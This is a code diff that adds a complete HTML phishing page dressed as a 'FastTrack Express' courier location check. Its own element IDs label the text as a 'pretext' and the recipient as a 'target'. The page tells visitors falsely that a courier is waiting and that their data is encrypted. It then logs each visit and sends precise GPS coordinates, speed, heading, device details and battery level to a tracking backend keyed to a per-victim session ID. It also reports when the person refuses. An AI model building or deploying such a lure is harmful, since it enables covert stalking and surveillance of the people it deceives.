@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>FastTrack Express - Location Verification</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="bg-slate-100 text-slate-800 min-h-screen flex flex-col justify-between font-sans">
+
+  <!-- Header -->
+  <header class="bg-white border-b border-slate-200 px-6 py-4 shadow-sm flex items-center justify-between">
+    <div class="flex items-center space-x-2">
+      <div id="companyIcon" class="w-9 h-9 rounded-lg bg-blue-600 text-white flex items-center justify-center font-bold text-xl">
+        📦
+      </div>
+      <div>
+        <h1 id="companyTitle" class="font-bold text-slate-900 text-base leading-tight">FastTrack Express</h1>
+        <p class="text-xs text-slate-500">Secure Dispatch & Verification</p>
+      </div>
+    </div>
+    <div class="flex items-center space-x-1 text-xs text-emerald-600 font-semibold bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
+      <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+      <span>Live Link</span>
+    </div>
+  </header>
+
+  <!-- Main Target Card -->
+  <main class="flex-grow flex items-center justify-center p-4">
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl border border-slate-200 p-6 sm:p-8 text-center">
+      
+      <!-- State 1: Ready to verify -->
+      <div id="initialState" class="space-y-6">
+        <div class="w-16 h-16 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center mx-auto text-2xl">
+          <i data-lucide="map-pin" class="w-8 h-8 text-blue-600"></i>
+        </div>
+
+        <div>
+          <h2 id="pretextHeading" class="text-2xl font-bold text-slate-900">
+            Confirm Delivery Location
+          </h2>
+          <p id="pretextDesc" class="text-sm text-slate-600 mt-2 leading-relaxed">
+            Your courier is currently in your delivery zone. To receive your shipment with zero delay, please confirm your current GPS position.
+          </p>
+        </div>
+
+        <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 text-xs text-slate-500 flex items-center justify-center space-x-2">
+          <i data-lucide="shield-check" class="w-4 h-4 text-emerald-500"></i>
+          <span>Encrypted 256-bit GPS Geolocation</span>
+        </div>
+
+        <button 
+          id="confirmLocBtn" 
+          onclick="requestLocation()" 
+          class="w-full py-4 bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold rounded-xl text-base shadow-lg shadow-blue-500/25 transition flex items-center justify-center space-x-2"
+        >
+          <i data-lucide="navigation" class="w-5 h-5"></i>
+          <span>Share Location & Confirm</span>
+        </button>
+      </div>
+
+      <!-- State 2: Requesting / Loading -->
+      <div id="loadingState" class="hidden space-y-4 py-8">
+        <div class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
+        <h3 class="text-lg font-bold text-slate-800">Calibrating Precision GPS...</h3>
+        <p class="text-xs text-slate-500">Please tap "Allow" if prompted by your browser to proceed.</p>
+      </div>
+
+      <!-- State 3: Confirmed Successfully -->
+      <div id="successState" class="hidden space-y-4 py-6">
+        <div class="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto">
+          <i data-lucide="check" class="w-10 h-10"></i>
+        </div>
+        <h3 class="text-2xl font-bold text-slate-900">Location Confirmed!</h3>
+        <p class="text-sm text-slate-600">
+          Your coordinates have been securely received. Your request is being processed.
+        </p>
+        <div class="p-3 bg-emerald-50 text-emerald-700 rounded-xl text-xs font-mono font-bold">
+          STATUS: VERIFIED & LOCKED
+        </div>
+      </div>
+
+      <!-- State 4: Permission Denied -->
+      <div id="deniedState" class="hidden space-y-4 py-6">
+        <div class="w-16 h-16 rounded-full bg-red-100 text-red-600 flex items-center justify-center mx-auto">
+          <i data-lucide="alert-triangle" class="w-10 h-10"></i>
+        </div>
+        <h3 class="text-xl font-bold text-slate-900">Location Permission Required</h3>
+        <p class="text-xs text-slate-600">
+          Browser location access was not granted. Please enable location permissions in your browser settings to verify.
+        </p>
+        <button onclick="requestLocation()" class="px-6 py-2.5 bg-slate-800 text-white text-xs font-bold rounded-lg">
+          Try Again
+        </button>
+      </div>
+
+    </div>
+  </main>
+
+  <footer class="text-center py-4 text-xs text-slate-400 border-t border-slate-200">
+    Secure Location Verification Protocol • Powered by GeoLocate Network
+  </footer>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('id');
+
+    // Notify backend that recipient opened the link
+    if (sessionId) {
+      fetch(`/api/track-visit/${sessionId}`, { method: 'POST' }).catch(() => {});
+    }
+
+    async function requestLocation() {
+      if (!sessionId) {
+        alert('Invalid tracking session');
+        return;
+      }
+
+      document.getElementById('initialState').classList.add('hidden');
+      document.getElementById('loadingState').classList.remove('hidden');
+
+      if (!navigator.geolocation) {
+        showDenied();
+        return;
+      }
+
+      // Check battery level if available
+      let batteryInfo = null;
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+        } catch (e) {}
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const payload = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            speed: position.coords.speed,
+            heading: position.coords.heading,
+            platform: navigator.platform || 'Mobile Browser',
+            userAgent: navigator.userAgent,
+            battery: batteryInfo
+          };
+
+          try {
+            const res = await fetch(`/api/report-location/${sessionId}`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+            const data = await res.json();
+            if (data.success) {
+              document.getElementById('loadingState').classList.add('hidden');
+              document.getElementById('successState').classList.remove('hidden');
+            } else {
+              showDenied();
+            }
+          } catch (e) {
+            showDenied();
+          }
+        },
+        (error) => {
+          console.warn('Geolocation denied:', error);
+          // Send denial signal to backend
+          fetch(`/api/report-location/${sessionId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ error: 'Permission denied' })
+          }).catch(() => {});
+          showDenied();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function showDenied() {
+      document.getElementById('loadingState').classList.add('hidden');
+      document.getElementById('deniedState').classList.remove('hidden');
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      lucide.createIcons();
+    });
+  </script>
+</body>
+</html>
